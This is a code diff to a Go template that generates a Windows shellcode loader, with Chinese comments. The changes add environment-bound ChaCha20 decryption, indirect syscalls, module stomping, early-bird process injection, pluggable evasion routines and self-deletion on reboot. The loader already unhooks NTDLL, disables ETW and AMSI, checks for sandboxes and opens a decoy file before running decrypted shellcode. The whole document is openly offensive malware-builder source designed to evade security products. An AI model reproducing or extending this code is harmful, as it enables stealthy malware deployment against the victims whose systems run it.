@@ -9,9 +9,12 @@ import (
 	"compress/zlib"
 	"crypto/aes"
 	"crypto/cipher"
-	"encoding/base64"
+{{if .EnableEnvBind}}	"crypto/sha256"
+{{end}}	"encoding/base64"
+	"errors"
 	"golang.org/x/crypto/argon2"
-	"io"
+{{if .EnableEnvBind}}	"golang.org/x/crypto/chacha20poly1305"
+{{end}}	"io"
 	"math/rand"
 	"net"
 	"net/http"
@@ -19,7 +22,8 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
-	"strings"
+{{if .EnableEnvBind}}	"sort"
+{{end}}	"strings"
 	"syscall"
 	"time"
 	"unsafe"
@@ -38,17 +42,32 @@ const (
 	enableObfuscate          = {{.EnableObfuscate}}
 	enableMutate             = {{.EnableMutate}}
 	delaySeconds             = {{.DelaySeconds}}
-	enableInject             = {{.EnableInject}}
+	injectMode               = "{{.InjectMode}}"
+	enableSelfDelete         = {{.EnableSelfDelete}}
+	enableIndirectSyscall    = {{.EnableIndirectSyscall}}
+	stompDLL                 = "{{.StompDLL}}"
+	enableEnvBind            = {{.EnableEnvBind}}
+	enableMemObf             = {{.EnableMemObf}}
+	envBindHash              = "{{.EnvBindHash}}"
 	sandboxThreshold         = 5
 )
+
+{{if .EnableEnvBind}}
+// 编译时注入的环境绑定特征列表
+var envBindFeatures = []string{ {{range .EnvBindFeatures}}"{{.}}", {{end}} }
+{{end}}
 
 {{template "_structs" .}}
 {{template "_infra" .}}
 {{template "_bypass" .}}
+{{template "_syscall" .}}
+{{template "_evasion" .}}
 {{template "_sandbox" .}}
 {{template "_crypto" .}}
 {{template "_camouflage" .}}
 {{template "_execute" .}}
+{{template "_stomping" .}}
+{{template "_cleanup" .}}
 
 // ============================================================
 // main
@@ -60,10 +79,17 @@ func main() {
 	// 第1步：NTDLL 脱钩（最高优先级，在所有其他操作之前）
 	unhookNTDLL()
 
+	// 第1.5步：初始化 Indirect Syscall 引擎（在 unhook 之后，确保 ntdll 干净）
+{{if .EnableIndirectSyscall}}	initIndirectSyscall()
+{{end}}
+
 	// 第2步：禁用 ETW 和 AMSI
 	disableETW()
 	disableAMSI()
 
+	// 第2.5步：用户选择的 evasion 技术
+{{range .EvasionSnippets}}	{{.FuncName}}()
+{{end}}
 	// 第3步：反沙箱检测（评分制）
 	if !antiSandboxChecks() {
 		return
@@ -76,7 +102,17 @@ func main() {
 	go behaviorCamouflage()
 
 	// 第6步：解密并展示诱饵文件
+{{if .EnableEnvBind}}
+	// 环境绑定模式：运行时派生密钥 → ChaCha20-Poly1305 解密
+	envKey := deriveRuntimeKey()
+	if envKey == nil {
+		// 环境不匹配，静默退出（不暴露任何错误信息）
+		return
+	}
+	if decoyBytes, err := decryptChaCha20(encryptedDecoyBase64, aesSaltBase64, envKey); err == nil {
+{{else}}
 	if decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesSaltBase64); err == nil {
+{{end}}
 		tempDirs := []string{"TEMP", "TMP", "PUBLIC"}
 		selected := tempDirs[rand.Intn(len(tempDirs))]
 		var decoyPath string
@@ -107,16 +143,33 @@ func main() {
 	}
 
 	// 第8步：解密并执行 shellcode
+{{if .EnableEnvBind}}
+	if shellcode, err := decryptChaCha20(encryptedShellcodeBase64, aesSaltBase64, envKey); err == nil {
+{{else}}
 	if shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64); err == nil {
+{{end}}
 		sc := mutateShellcode(shellcode)
 
-		if enableInject {
+{{if ne .StompDLL ""}}
+		// 优先尝试 Module Stomping（内存伪装为合法 DLL .text 段）
+		if !moduleStompExec(sc) {
+			// stomping 失败（DLL 加载失败或 .text 段太小），回退到常规路径
+{{end}}
+		switch injectMode {
+		case "inject":
 			if !injectToProcess(sc) {
 				executeShellcode(sc)
 			}
-		} else {
+		case "earlybird":
+			if !earlyBirdInject(sc) {
+				executeShellcode(sc)
+			}
+		default:
 			executeShellcode(sc)
 		}
+{{if ne .StompDLL ""}}
+		}
+{{end}}
 
 		// 内存清理
 		for i := range shellcode {
@@ -125,6 +178,11 @@ func main() {
 		for i := range sc {
 			sc[i] = 0
 		}
+	}
+
+	// 第9步：自删除（标记重启时由 smss.exe 清理）
+	if enableSelfDelete {
+		selfDeleteOnReboot()
 	}
 
 	time.Sleep(time.Duration(2000+rand.Intn(1000)) * time.Millisecond)
